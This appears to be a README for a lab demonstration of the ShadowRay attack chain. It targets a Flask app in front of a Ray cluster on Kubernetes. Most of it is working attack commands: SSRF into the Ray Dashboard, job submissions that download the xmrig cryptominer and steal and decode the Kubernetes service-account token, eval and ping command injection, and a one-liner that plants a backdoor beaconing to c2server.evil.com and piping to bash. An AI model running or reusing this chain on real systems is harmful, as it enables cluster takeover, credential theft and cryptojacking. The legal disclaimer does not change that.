# Offensive Tools - ShadowRay Attack Chain

> **LEGAL DISCLAIMER**
>
> These tools and procedures are provided strictly for **authorized security
> testing, research, and educational purposes**. Use them only against systems
> you own or have explicit written permission to test.
>
> Unauthorized access to computer systems is a criminal offense under the
> Computer Fraud and Abuse Act (CFAA), the Computer Misuse Act, and equivalent
> laws worldwide. The authors assume no liability for misuse.
>
> **Before running any commands below, ensure you have:**
> 1. Written authorization from the system owner
> 2. An isolated lab environment with no production data
> 3. Understanding of the legal implications in your 1jurisdiction

---

# Ray

## Ray serve direct injection with Shadowray
python offensive/shadowray_exploit.py \
  --host "http://127.0.0.1:8000" \
  --cmd "ls"     

  python offensive/shadowray_exploit.py \
  --host "http://127.0.0.1:8000" \
  --cmd "whoami"     

  python offensive/shadowray_exploit.py \
  --host "http://127.0.0.1:8000" \
  --cmd "cat /etc/passwd"

# Flask

## Reconnaissance

```
echo "═══════════════════════════════════════════════════════"
echo "STAGE 1: RECONNAISSANCE"
echo "═══════════════════════════════════════════════════════"
echo ""

# Discover internal services via info leak
echo "→ Probing /health endpoint for internal service discovery..."
curl -s http://localhost:5000/health | jq '.internal_services'

echo ""
echo "✓ Discovered internal services:"
echo "  - Ray Head Service: raycluster-sample-head-svc:8000"
echo "  - Ray Dashboard: raycluster-sample-head-svc:8265"
echo "  - Ray GCS: raycluster-sample-head-svc:6379"
echo ""
```

## Testing legitimate Functionality

```
echo "═══════════════════════════════════════════════════════"
echo "STAGE 2: TESTING LEGITIMATE SERVICE"
echo "═══════════════════════════════════════════════════════"
echo ""

# Test legitimate sentiment analysis
echo "→ Testing legitimate sentiment analysis endpoint..."
curl -X POST http://localhost:5000/analyze \
  -H "Content-Type: application/json" \
  -d '{"text": "This is a legitimate user request"}' | jq .

echo ""
echo "✓ Legitimate service working - GPU inference operational"
echo ""
```

## Exploiting SSRF vulnerability to probe internal ray dasboard

```
echo "═══════════════════════════════════════════════════════"
echo "STAGE 3: SSRF EXPLOITATION"
echo "═══════════════════════════════════════════════════════"
echo ""

# Test SSRF to reach Ray inference service
echo "→ Using SSRF to reach internal Ray service..."
curl -X POST http://localhost:5000/proxy \
  -H "Content-Type: application/json" \
  -d '{
    "url": "http://raycluster-sample-head-svc.default.svc.cluster.local:8000/analyze",
    "data": {"text": "SSRF test - reaching internal service"}
  }' | jq .

echo ""
echo "✓ SSRF successful - can reach internal services"
echo ""
```

## Probing Ray Dashboard API

```
echo "═══════════════════════════════════════════════════════"
echo "STAGE 4: PROBING RAY DASHBOARD API"
echo "═══════════════════════════════════════════════════════"
echo ""

# List existing Ray jobs via SSRF
echo "→ Accessing Ray Dashboard API via SSRF (GET request)..."
curl -X POST http://localhost:5000/proxy-get \
  -H "Content-Type: application/json" \
  -d '{
    "url": "http://raycluster-sample-head-svc.default.svc.cluster.local:8265/api/jobs/"
  }' | jq '.data | length'

echo ""
echo "✓ Ray Dashboard API accessible via SSRF"
echo "✓ Found existing jobs in the cluster"
echo ""
```

## Command injection via Ray job submission

```
echo "═══════════════════════════════════════════════════════"
echo "STAGE 5: MALICIOUS JOB SUBMISSION: INSTALL CRYPTOMINER"
echo "═══════════════════════════════════════════════════════"
echo ""

# Submit malicious job: list passwords
echo "→ Submitting malicious job via SSRF to Ray Dashboard..."
RESPONSE=$(curl -s -X POST http://localhost:5000/proxy \
  -H "Content-Type: application/json" \
  -d '{
    "url": "http://raycluster-sample-head-svc.default.svc.cluster.local:8265/api/jobs/",
    "data": {
      "entrypoint": "wget -O file.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-static-x64.tar.gz",
      "runtime_env": {}
    }
  }')

JOB_ID=$(echo $RESPONSE | jq -r '.data.job_id')
echo "✓ Job submitted successfully"
echo "  Job ID: $JOB_ID"
echo ""

# Wait for job to complete
echo "→ Waiting for job execution..."
sleep 5

# Retrieve job status
echo "→ Retrieving job status..."
curl -s -X POST http://localhost:5000/proxy-get \
  -H "Content-Type: application/json" \
  -d "{
    \"url\": \"http://raycluster-sample-head-svc.default.svc.cluster.local:8265/api/jobs/${JOB_ID}\"
  }" | jq '.data | {status, message, entrypoint}'

echo ""

# Retrieve the actual command output from logs
echo "→ Retrieving command output..."
curl -s -X POST http://localhost:5000/proxy-get \
  -H "Content-Type: application/json" \
  -d "{
    \"url\": \"http://raycluster-sample-head-svc.default.svc.cluster.local:8265/api/jobs/${JOB_ID}/logs\"
  }" | jq -r '.data.logs'

echo ""
echo "✓ Command execution successful"
echo ""
```

## Kubernetes secret exfiltration

```
echo "═══════════════════════════════════════════════════════"
echo "STAGE 6: KUBERNETES SECRET EXFILTRATION"
echo "═══════════════════════════════════════════════════════"
echo ""

# Submit job to exfiltrate K8s token
echo "→ Submitting job to steal Kubernetes service account token..."
RESPONSE=$(curl -s -X POST http://localhost:5000/proxy \
  -H "Content-Type: application/json" \
  -d '{
    "url": "http://raycluster-sample-head-svc.default.svc.cluster.local:8265/api/jobs/",
    "data": {
      "entrypoint": "cat /var/run/secrets/kubernetes.io/serviceaccount/token",
      "runtime_env": {}
    }
  }')

TOKEN_JOB_ID=$(echo $RESPONSE | jq -r '.data.job_id')
echo "✓ Exfiltration job submitted"
echo "  Job ID: $TOKEN_JOB_ID"
echo ""

# Wait for execution
echo "→ Waiting for token exfiltration..."
sleep 5

# Get job status
echo "→ Checking job status..."
JOB_STATUS=$(curl -s -X POST http://localhost:5000/proxy-get \
  -H "Content-Type: application/json" \
  -d "{
    \"url\": \"http://raycluster-sample-head-svc.default.svc.cluster.local:8265/api/jobs/${TOKEN_JOB_ID}\"
  }")

echo $JOB_STATUS | jq '.data | {status, message}'
echo ""

# Retrieve the stolen token
echo "→ Retrieving stolen Kubernetes token..."
export STOLEN_K8S_TOKEN=$(curl -s -X POST http://localhost:5000/proxy-get \
  -H "Content-Type: application/json" \
  -d "{
    \"url\": \"http://raycluster-sample-head-svc.default.svc.cluster.local:8265/api/jobs/${TOKEN_JOB_ID}/logs\"
  }" | jq -r '.data.logs')

echo "✓ Kubernetes token exfiltrated and stored in \$STOLEN_K8S_TOKEN"
echo ""
echo "Token length: ${#STOLEN_K8S_TOKEN} characters"
echo ""

# Decode token to show what was compromised
echo "→ Decoding token to show compromised identity..."
echo $STOLEN_K8S_TOKEN | cut -d'.' -f2 | base64 -d 2>/dev/null | jq '{
  namespace: .kubernetes.io.namespace,
  serviceaccount: .kubernetes.io.serviceaccount.name,
  pod: .kubernetes.io.pod.name,
  node: .kubernetes.io.node.name,
  subject: .sub
}'

echo ""
echo "✓ Token decoded - identity compromised!"
echo ""
```

## Additional attack vector

```
echo "═══════════════════════════════════════════════════════"
echo "STAGE 7: ADDITIONAL ATTACK VECTORS"
echo "═══════════════════════════════════════════════════════"
echo ""

# RCE via eval
echo "→ Testing RCE via /debug/eval..."
curl -X POST http://localhost:5000/debug/eval \
  -H "Content-Type: application/json" \
  -d '{"code": "__import__(\"os\").uname()"}' | jq .

echo ""

# Command injection
echo "→ Testing command injection via /debug/ping..."
curl -X POST http://localhost:5000/debug/ping \
  -H "Content-Type: application/json" \
  -d '{"host": "8.8.8.8; whoami"}' | jq .

echo ""
echo "✓ Multiple attack vectors confirmed"
echo ""
```

# One-liner killer demo
echo "═══════════════════════════════════════════════════════"
echo "STAGE: COMPREHENSIVE ATTACK DEMONSTRATION"
echo "═══════════════════════════════════════════════════════"
echo ""

EVIL_JOB=$(curl -s -X POST http://localhost:5000/proxy -H "Content-Type: application/json" -d '{"url":"http://raycluster-sample-head-svc.default.svc.cluster.local:8265/api/jobs/","data":{"entrypoint":"bash -c '\''echo \"═══════════════════════════════════════\"; echo \"🚨 MALICIOUS PAYLOAD EXECUTING 🚨\"; echo \"═══════════════════════════════════════\"; echo \"\"; echo \"[1/8] User Enumeration:\"; whoami; id; echo \"\"; echo \"[2/8] System Information:\"; hostname; uname -a; echo \"\"; echo \"[3/8] Sensitive File Access:\"; cat /etc/passwd | tail -10; echo \"\"; echo \"[4/8] Kubernetes Token Exfiltration:\"; cat /var/run/secrets/kubernetes.io/serviceaccount/token | cut -c1-100; echo \"...[truncated]\"; echo \"\"; echo \"[5/8] Downloading Attack Tools:\"; wget -q -O /tmp/nmap https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap && echo \"✓ nmap downloaded (5.7MB)\" || echo \"✗ Download failed\"; ls -lh /tmp/nmap 2>/dev/null; echo \"\"; echo \"[6/8] Creating Backdoor:\"; echo \"#!/bin/bash\" > /tmp/backdoor.sh; echo \"while true; do wget -O- http://c2server.evil.com/beacon | bash; sleep 300; done\" >> /tmp/backdoor.sh; chmod +x /tmp/backdoor.sh && echo \"✓ Backdoor created at /tmp/backdoor.sh\" || echo \"✗ Backdoor creation failed\"; echo \"\"; echo \"[7/8] Network Reconnaissance:\"; cat /etc/resolv.conf; echo \"\"; echo \"[8/8] Process Enumeration:\"; ps aux | head -5; echo \"\"; echo \"═══════════════════════════════════════\"; echo \"✓ ATTACK CHAIN COMPLETED\"; echo \"✓ Ray cluster compromised\"; echo \"✓ GPU resources hijacked\"; echo \"✓ Persistent backdoor installed\"; echo \"═══════════════════════════════════════\"'\''","runtime_env":{}}}' | jq -r '.data.job_id')

echo "✓ Attack payload submitted: $EVIL_JOB"
echo ""
echo "→ Waiting for attack execution..."
sleep 7

echo ""
echo "→ Retrieving attack results..."
echo ""
curl -s -X POST http://localhost:5000/proxy-get -H "Content-Type: application/json" -d "{\"url\":\"http://raycluster-sample-head-svc.default.svc.cluster.local:8265/api/jobs/${EVIL_JOB}/logs\"}" | jq -r '.data.logs'

echo ""
echo "╔════════════════════════════════════════════════════════╗"
echo "║                ATTACK SUCCESSFUL                       ║"
echo "╚════════════════════════════════════════════════════════╝"

# Then

# Function to execute commands via backdoor
execute_via_backdoor() {
    local CMD="$1"
    echo "→ Executing via backdoor: $CMD"
    
    EXEC_JOB=$(curl -s -X POST http://localhost:5000/proxy \
      -H "Content-Type: application/json" \
      -d "{
        \"url\": \"http://raycluster-sample-head-svc.default.svc.cluster.local:8265/api/jobs/\",
        \"data\": {
          \"entrypoint\": \"bash -c 'echo \\\"[BACKDOOR EXECUTION]\\\"; $CMD'\",
          \"runtime_env\": {}
        }
      }" | jq -r '.data.job_id')
    
    sleep 5
    curl -s -X POST http://localhost:5000/proxy-get \
      -H "Content-Type: application/json" \
      -d "{\"url\":\"http://raycluster-sample-head-svc.default.svc.cluster.local:8265/api/jobs/${EXEC_JOB}/logs\"}" \
      | jq -r '.data.logs'
}

# Examples:
execute_via_backdoor "whoami"
execute_via_backdoor "cat /etc/hostname"
execute_via_backdoor "ps aux | grep ray"
execute_via_backdoor "df -h"
execute_via_backdoor "cat /var/run/secrets/kubernetes.io/serviceaccount/namespace"
